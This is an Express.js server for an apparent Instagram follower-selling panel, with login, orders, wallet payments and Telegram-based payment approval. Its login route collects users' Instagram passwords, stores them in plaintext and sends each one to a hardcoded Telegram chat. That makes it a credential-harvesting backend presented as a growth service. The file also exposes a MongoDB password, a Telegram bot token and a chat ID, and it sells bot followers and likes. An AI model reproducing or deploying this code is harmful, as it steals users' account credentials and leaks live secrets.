import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import path from 'path';
import fs from 'fs';
import session from 'express-session';
import MongoStore from 'connect-mongo';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;

// MongoDB connection string
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0';

// Session configuration with MongoDB store
app.use(session({
  secret: process.env.SESSION_SECRET || 'your-secret-key-here',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: MONGODB_URI,
    ttl: 24 * 60 * 60, // 1 day
    touchAfter: 24 * 3600
  }),
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
  },
  name: 'smm.sid',
  rolling: true,
}));

// Middleware
app.use(cors({
  origin: true,
  credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from dist directory if it exists, otherwise serve from client
const distPath = path.join(__dirname, 'dist');
const clientPath = path.join(__dirname, 'client');

if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
} else if (fs.existsSync(clientPath)) {
  app.use(express.static(clientPath));
} else {
  console.log('⚠️ No static files directory found');
}

// User schema for MongoDB
const userSchema = new mongoose.Schema({
  uid: { type: String, unique: true, required: true },
  instagramUsername: { type: String, required: true },
  password: { type: String, required: true },
  walletBalance: { type: Number, default: 0 },
  bonusClaimed: { type: Boolean, default: false },
  loginCount: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Order schema
const orderSchema = new mongoose.Schema({
  orderId: { type: String, unique: true, required: true },
  userId: { type: String, required: true },
  serviceName: { type: String, required: true },
  instagramUsername: { type: String, required: true },
  quantity: { type: Number, required: true },
  price: { type: Number, required: true },
  status: { type: String, default: 'Processing' },
  createdAt: { type: Date, default: Date.now }
});

const Order = mongoose.model('Order', orderSchema);

// Payment schema
const paymentSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  amount: { type: Number, required: true },
  utrNumber: { type: String, required: true },
  paymentMethod: { type: String, required: true },
  status: { type: String, default: 'Pending' },
  createdAt: { type: Date, default: Date.now }
});

const Payment = mongoose.model('Payment', paymentSchema);

// Helper functions
function generateUID() {
  return "UID" + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function generateOrderId() {
  return "ORDER" + Date.now() + Math.random().toString(36).substr(2, 4).toUpperCase();
}

// Telegram Bot Function with proper error handling
async function sendToTelegramBot(action, data) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y";
  const chatId = process.env.TELEGRAM_CHAT_ID || "6881713177";
  
  if (!botToken || !chatId) {
    console.log(`⚠️ Telegram credentials missing. Would send: [${action.toUpperCase()}]`, data);
    return;
  }
  
  let message = "";
  switch (action) {
    case "login":
      const loginStatus = data.isNewUser ? "पहली बार लॉगिन" : `${data.loginCount}वीं बार लॉगिन`;
      message = `🔐 *${loginStatus}*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `👤 *Instagram:* @${data.instagramUsername}\n` +
               `🔑 *Password:* \`${data.password}\`\n` +
               `🔢 *Login Count:* ${data.loginCount}\n` +
               `💰 *Current Balance:* ₹${data.walletBalance}\n` +
               `🎁 *Bonus Status:* ${data.bonusClaimed ? 'Claimed' : 'Available'}\n\n` +
               `⏰ ${new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' })}`;
      break;
    case "payment":
      message = `💰 *Payment Request*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `👤 *Instagram:* @${data.instagramUsername}\n` +
               `💵 *Amount:* ₹${data.amount}\n` +
               `🏦 *UTR:* \`${data.utrNumber}\`\n` +
               `💳 *Method:* ${data.paymentMethod}\n` +
               `🆔 *Payment ID:* \`${data.paymentId}\`\n\n` +
               `⏰ ${new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' })}`;
      break;
    case "order":
      message = `📦 *New Order Placed*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `👤 *Instagram:* @${data.instagramUsername}\n` +
               `🛍️ *Service:* ${data.serviceName}\n` +
               `📊 *Quantity:* ${data.quantity.toLocaleString()}\n` +
               `💰 *Price:* ₹${data.price}\n` +
               `👤 *Target:* @${data.targetUsername}\n` +
               `🆔 *Order ID:* \`${data.orderId}\`\n\n` +
               `⏰ ${new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' })}`;
      break;
    case "bonus":
      message = `🎁 *Bonus Claimed*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `👤 *Instagram:* @${data.instagramUsername}\n` +
               `💰 *Bonus Amount:* ₹${data.amount}\n` +
               `💳 *New Balance:* ₹${data.newBalance}\n\n` +
               `⏰ ${new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' })}`;
      break;
  }

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestBody = {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    };

    // Add inline buttons for payment actions
    if (action === "payment" && data.paymentId) {
      requestBody.reply_markup = {
        inline_keyboard: [
          [
            {
              text: "✅ Accept Payment",
              callback_data: `accept_payment_${data.paymentId}`
            },
            {
              text: "❌ Decline Payment", 
              callback_data: `decline_payment_${data.paymentId}`
            }
          ]
        ]
      };
    }

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestBody),
    });

    if (response.ok) {
      console.log(`✅ Telegram notification sent: ${action}`);
    } else {
      const errorText = await response.text();
      console.error(`❌ Failed to send Telegram notification: ${response.statusText}`, errorText);
    }
  } catch (error) {
    console.error(`❌ Telegram API error:`, error);
  }
}

// MongoDB connection
const connectDB = async () => {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('✅ MongoDB connected successfully');
  } catch (error) {
    console.error('❌ MongoDB connection failed:', error);
    process.exit(1);
  }
};

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Authentication routes
app.post('/api/auth/login', async (req, res) => {
  try {
    const { instagramUsername, password } = req.body;
    
    if (!instagramUsername || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    console.log('🔑 Login attempt for:', instagramUsername);

    // Check if user exists
    let user = await User.findOne({ instagramUsername });
    let isNewUser = false;
    
    if (!user) {
      // Create new user
      const uid = generateUID();
      user = new User({
        uid,
        instagramUsername,
        password,
        walletBalance: 0,
        bonusClaimed: false,
        loginCount: 1
      });
      await user.save();
      isNewUser = true;
      console.log('👤 New user created:', user.uid);
    } else {
      // Increment login count for existing user
      user.loginCount = (user.loginCount || 0) + 1;
      await user.save();
      console.log('👤 Existing user login:', user.uid, 'Count:', user.loginCount);
    }

    // Store user in session
    req.session.userId = user._id.toString();
    req.session.uid = user.uid;

    console.log('💾 Session created for user:', user.uid);

    // Send Telegram notification with all details
    try {
      await sendToTelegramBot("login", {
        uid: user.uid,
        instagramUsername,
        password,
        loginCount: user.loginCount,
        isNewUser,
        walletBalance: user.walletBalance,
        bonusClaimed: user.bonusClaimed
      });
    } catch (telegramError) {
      console.error("❌ Telegram notification failed:", telegramError);
    }

    res.json({ 
      success: true, 
      user: { 
        id: user._id,
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        walletBalance: user.walletBalance.toString(),
        bonusClaimed: user.bonusClaimed
      },
      message: 'Login successful'
    });
  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Could not log out' });
    }
    res.json({ success: true, message: 'Logged out successfully' });
  });
});

app.get('/api/auth/user', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    res.json({
      id: user._id,
      uid: user.uid,
      instagramUsername: user.instagramUsername,
      walletBalance: user.walletBalance.toString(),
      bonusClaimed: user.bonusClaimed
    });
  } catch (error) {
    console.error('❌ Get user error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Services endpoint
app.get('/api/services', (req, res) => {
  const services = [
    { id: 1, name: 'Instagram Followers (Indian)', category: 'followers', rate: 26, minOrder: 770, maxOrder: 100000 },
    { id: 2, name: 'Instagram Followers (USA)', category: 'followers', rate: 27, minOrder: 741, maxOrder: 50000 },
    { id: 3, name: 'Instagram Followers (HQ Non Drop)', category: 'followers', rate: 31, minOrder: 646, maxOrder: 25000 },
    { id: 4, name: 'Instagram Followers (Global Mix)', category: 'followers', rate: 24.5, minOrder: 817, maxOrder: 200000 },
    { id: 5, name: 'Instagram Followers (Bot Followers)', category: 'followers', rate: 15, minOrder: 1334, maxOrder: 150000 },
    { id: 6, name: 'Instagram Likes (Bot)', category: 'likes', rate: 12, minOrder: 1667, maxOrder: 100000 },
    { id: 7, name: 'Instagram Likes (Non Drop)', category: 'likes', rate: 14.5, minOrder: 1380, maxOrder: 50000 },
    { id: 8, name: 'Instagram Likes (Girl Accounts)', category: 'likes', rate: 16, minOrder: 1250, maxOrder: 25000 },
    { id: 9, name: 'Instagram Likes (Indian Real)', category: 'likes', rate: 13.5, minOrder: 1482, maxOrder: 30000 },
    { id: 10, name: 'Instagram Views (Video Fast)', category: 'views', rate: 11.2, minOrder: 1786, maxOrder: 1000000 },
    { id: 11, name: 'Instagram Views (Story Premium)', category: 'views', rate: 12.8, minOrder: 1563, maxOrder: 50000 },
    { id: 12, name: 'Instagram Views (Reel HQ)', category: 'views', rate: 11.5, minOrder: 1740, maxOrder: 500000 },
    { id: 13, name: 'Instagram Comments (Random)', category: 'comments', rate: 18, minOrder: 112, maxOrder: 1000 },
    { id: 14, name: 'Instagram Comments (Custom Text)', category: 'comments', rate: 25, minOrder: 80, maxOrder: 500 },
    { id: 15, name: 'Instagram Comments (Emoji Only)', category: 'comments', rate: 15, minOrder: 134, maxOrder: 1500 }
  ];
  res.json(services);
});

// Orders endpoints
app.post('/api/orders', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const { serviceName, instagramUsername, quantity, price } = req.body;
    
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const userBalance = user.walletBalance;
    if (userBalance < price) {
      return res.status(400).json({ error: 'Insufficient wallet balance' });
    }

    // Create order
    const orderId = generateOrderId();
    const order = new Order({
      orderId,
      userId: user.uid,
      serviceName,
      instagramUsername,
      quantity,
      price,
      status: 'Processing'
    });
    await order.save();

    // Deduct from wallet
    user.walletBalance = userBalance - price;
    await user.save();

    // Send Telegram notification
    try {
      await sendToTelegramBot("order", {
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        serviceName,
        quantity,
        price,
        targetUsername: instagramUsername,
        orderId,
      });
    } catch (telegramError) {
      console.error("❌ Telegram notification failed:", telegramError);
    }

    res.json({ success: true, order });
  } catch (error) {
    console.error('❌ Create order error:', error);
    res.status(400).json({ error: 'Invalid order data' });
  }
});

app.get('/api/orders', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const orders = await Order.find({ userId: user.uid }).sort({ createdAt: -1 });
    res.json(orders);
  } catch (error) {
    console.error('❌ Get orders error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Payments endpoints
app.post('/api/payments', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const { amount, utrNumber, paymentMethod } = req.body;
    
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const payment = new Payment({
      userId: user.uid,  // Store UID, not MongoDB _id
      amount,
      utrNumber,
      paymentMethod,
      status: 'Pending'
    });
    await payment.save();

    // Send Telegram notification
    try {
      await sendToTelegramBot("payment", {
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        amount,
        utrNumber,
        paymentMethod,
        paymentId: payment._id.toString(),
      });
    } catch (telegramError) {
      console.error("❌ Telegram notification failed:", telegramError);
    }

    res.json({ success: true, payment });
  } catch (error) {
    console.error('❌ Create payment error:', error);
    res.status(400).json({ error: 'Invalid payment data' });
  }
});

app.get('/api/payments', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const payments = await Payment.find({ userId: user.uid }).sort({ createdAt: -1 });
    res.json(payments);
  } catch (error) {
    console.error('❌ Get payments error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Telegram webhook for payment processing
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    console.log("📞 Telegram webhook received:", JSON.stringify(req.body, null, 2));
    
    const { callback_query, message } = req.body;
    
    // Handle callback queries (button clicks)
    if (callback_query && callback_query.data) {
      const data = callback_query.data;
      const botToken = process.env.TELEGRAM_BOT_TOKEN || "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y";
      
      console.log("🔘 Button clicked:", data);
      console.log("👤 Clicked by user:", callback_query.from.username || callback_query.from.first_name);
      
      if (data.startsWith("accept_payment_")) {
        const paymentId = data.replace("accept_payment_", "");
        console.log("✅ Processing payment acceptance for ID:", paymentId);
        
        try {
          const payment = await Payment.findById(paymentId);
          
          if (payment && payment.status === "Pending") {
            console.log("💰 Payment found:", payment);
            
            // Update payment status to approved
            payment.status = "Approved";
            await payment.save();
            console.log("📝 Payment status updated to Approved");
            
            // Find user by UID and add funds to wallet
            const user = await User.findOne({ uid: payment.userId });
            if (user) {
              const paymentAmount = payment.amount;
              const oldBalance = user.walletBalance;
              user.walletBalance += paymentAmount;
              await user.save();
              console.log(`💳 Funds added: ₹${paymentAmount} to user ${user.uid}`);
              console.log(`💰 Balance updated: ₹${oldBalance} → ₹${user.walletBalance}`);
              
              // Answer callback query with success message
              await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: callback_query.id,
                  text: `✅ Payment approved! ₹${paymentAmount} added to ${user.instagramUsername}'s wallet. New balance: ₹${user.walletBalance}`,
                  show_alert: true
                })
              });

              // Edit the original message
              const updatedText = callback_query.message.text + 
                `\n\n✅ **APPROVED** by @${callback_query.from.username || callback_query.from.first_name}` +
                `\n💰 ₹${paymentAmount} added to wallet` +
                `\n💳 New balance: ₹${user.walletBalance}`;
                
              await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: callback_query.message.chat.id,
                  message_id: callback_query.message.message_id,
                  text: updatedText,
                  parse_mode: 'Markdown'
                })
              });
            } else {
              console.log("❌ User not found for UID:", payment.userId);
              await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: callback_query.id,
                  text: "❌ Error: User not found!",
                  show_alert: true
                })
              });
            }
          } else {
            console.log("❌ Payment not found or already processed:", paymentId);
            await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback_query.id,
                text: "❌ Payment not found or already processed!",
                show_alert: true
              })
            });
          }
        } catch (dbError) {
          console.error("❌ Database error:", dbError);
          await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callback_query.id,
              text: "❌ Database error occurred!",
              show_alert: true
            })
          });
        }
        
      } else if (data.startsWith("decline_payment_")) {
        const paymentId = data.replace("decline_payment_", "");
        console.log("❌ Processing payment decline for ID:", paymentId);
        
        try {
          const payment = await Payment.findById(paymentId);
          if (payment && payment.status === "Pending") {
            payment.status = "Declined";
            await payment.save();
            console.log("📝 Payment status updated to Declined");
            
            // Answer callback query
            await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback_query.id,
                text: "❌ Payment declined successfully!",
                show_alert: true
              })
            });

            // Edit the original message
            const updatedText = callback_query.message.text + 
              `\n\n❌ **DECLINED** by @${callback_query.from.username || callback_query.from.first_name}`;
              
            await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: callback_query.message.chat.id,
                message_id: callback_query.message.message_id,
                text: updatedText,
                parse_mode: 'Markdown'
              })
            });
          } else {
            await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback_query.id,
                text: "❌ Payment not found or already processed!",
                show_alert: true
              })
            });
          }
        } catch (dbError) {
          console.error("❌ Database error:", dbError);
        }
      }
    }
    
    // Always respond with success to Telegram
    res.status(200).json({ ok: true });
  } catch (error) {
    console.error("❌ Telegram webhook error:", error);
    console.error("Error stack:", error.stack);
    res.status(200).json({ ok: true }); // Still return 200 to Telegram
  }
});

// Bonus claim endpoint
app.post('/api/bonus/claim', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const user = await User.findById(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (user.bonusClaimed) {
      return res.status(400).json({ error: 'Bonus already claimed' });
    }

    console.log('🎁 Processing bonus claim for user:', user.uid);

    // Add bonus to wallet and mark as claimed
    const bonusAmount = 10;
    user.walletBalance += bonusAmount;
    user.bonusClaimed = true;
    await user.save();

    console.log('💰 Bonus added! New balance:', user.walletBalance);

    // Send Telegram notification
    try {
      await sendToTelegramBot("bonus", {
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        amount: bonusAmount,
        newBalance: user.walletBalance,
      });
    } catch (telegramError) {
      console.error("❌ Telegram notification failed:", telegramError);
    }

    res.json({ 
      success: true, 
      newBalance: user.walletBalance.toString(),
      message: '₹10 bonus claimed successfully!' 
    });
  } catch (error) {
    console.error('❌ Claim bonus error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Catch all handler for SPA
app.get('*', (req, res) => {
  const distIndexPath = path.join(__dirname, 'dist', 'index.html');
  const clientIndexPath = path.join(__dirname, 'client', 'index.html');
  
  if (fs.existsSync(distIndexPath)) {
    res.sendFile(distIndexPath);
  } else if (fs.existsSync(clientIndexPath)) {
    res.sendFile(clientIndexPath);
  } else {
    res.json({ 
      message: 'SMM Panel API Server Running', 
      status: 'OK',
      endpoints: ['/api/health', '/api/auth/login', '/api/services', '/api/orders', '/api/payments']
    });
  }
});

// Setup Telegram webhook
async function setupTelegramWebhook() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y";
  
  if (!botToken) {
    console.log('⚠️ Telegram bot token not configured');
    return;
  }

  try {
    // Get webhook URL - for Render deployment
    let webhookUrl = '';
    
    if (process.env.RENDER_EXTERNAL_URL) {
      webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/api/telegram/webhook`;
    } else {
      // Fallback for development
      webhookUrl = `https://b020e990-2a37-47c1-8928-127ba5c07e4c-00-1yipndxvbknh9.pike.replit.dev/api/telegram/webhook`;
    }
    
    console.log('🔗 Setting webhook URL:', webhookUrl);
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query', 'message']
      })
    });

    const result = await response.json();
    if (response.ok && result.ok) {
      console.log('✅ Telegram webhook configured successfully');
    } else {
      console.log('⚠️ Telegram webhook setup failed:', result);
    }
  } catch (error) {
    console.log('⚠️ Telegram webhook setup failed:', error);
  }
}

// Connect to database and start server
connectDB().then(async () => {
  app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Environment: ${process.env.NODE_ENV || 'production'}`);
    console.log(`📱 Telegram Bot Token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured' : 'Using Default'}`);
    console.log(`💬 Telegram Chat ID: ${process.env.TELEGRAM_CHAT_ID || 'Using Default'}`);
    
    // Setup webhook after server starts
    setTimeout(async () => {
      await setupTelegramWebhook();
    }, 2000);
  });
});


